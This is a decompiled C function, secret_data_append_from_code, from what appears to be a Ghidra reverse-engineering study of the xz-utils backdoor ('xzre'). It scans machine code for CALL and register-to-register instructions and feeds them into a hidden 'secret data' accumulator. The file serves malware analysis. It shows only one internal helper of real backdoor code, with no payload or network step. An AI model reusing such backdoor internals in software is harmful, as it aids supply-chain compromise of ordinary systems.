// /home/kali/xzre-ghidra/xzregh/10AA00_secret_data_append_from_code.c
// Function: secret_data_append_from_code @ 0x10AA00
// Calling convention: __stdcall
// Prototype: BOOL __stdcall secret_data_append_from_code(void * code_start, void * code_end, secret_data_shift_cursor_t shift_cursor, uint shift_count, BOOL start_from_call)


/*
 * AutoDoc: Sweeps a code range and feeds instructions to secret_data_append_from_instruction. When start_from_call is TRUE it first finds
 * the next CALL via find_call_instruction, then loops up to shift_count times, each time calling find_reg2reg_instruction to
 * locate a qualifying instruction and shifting the supplied cursor. Returning FALSE means it could not find enough instructions in
 * the provided span.
 */

#include "xzre_types.h"

BOOL secret_data_append_from_code
               (void *code_start,void *code_end,secret_data_shift_cursor_t shift_cursor,
               uint shift_count,BOOL start_from_call)

{
  BOOL success;
  long i;
  dasm_ctx_t *ctx_cursor;
  ulong appended;
  secret_data_shift_cursor_t cursor_copy[3];
  dasm_ctx_t scan_ctx;
  
  ctx_cursor = &scan_ctx;
  for (i = 0x16; i != 0; i = i + -1) {
    *(undefined4 *)&ctx_cursor->instruction = 0;
    ctx_cursor = (dasm_ctx_t *)((long)&ctx_cursor->instruction + 4);
  }
  cursor_copy[0] = shift_cursor;
  if (start_from_call != FALSE) {
    success = find_call_instruction((u8 *)code_start,(u8 *)code_end,(u8 *)0x0,&scan_ctx);
    if (success == FALSE) {
      return FALSE;
    }
    code_start = scan_ctx.instruction + scan_ctx.instruction_size;
  }
  appended = 0;
  do {
    success = find_reg2reg_instruction((u8 *)code_start,(u8 *)code_end,&scan_ctx);
    if (success == FALSE) {
LAB_0010aa80:
      return (uint)(shift_count == (uint)appended);
    }
    if (appended == shift_count) {
      if (shift_count < (uint)appended) {
        return FALSE;
      }
      goto LAB_0010aa80;
    }
    appended = appended + 1;
    success = secret_data_append_from_instruction(&scan_ctx,cursor_copy);
    if (success == FALSE) {
      return FALSE;
    }
    code_start = scan_ctx.instruction + scan_ctx.instruction_size;
  } while( TRUE );
}

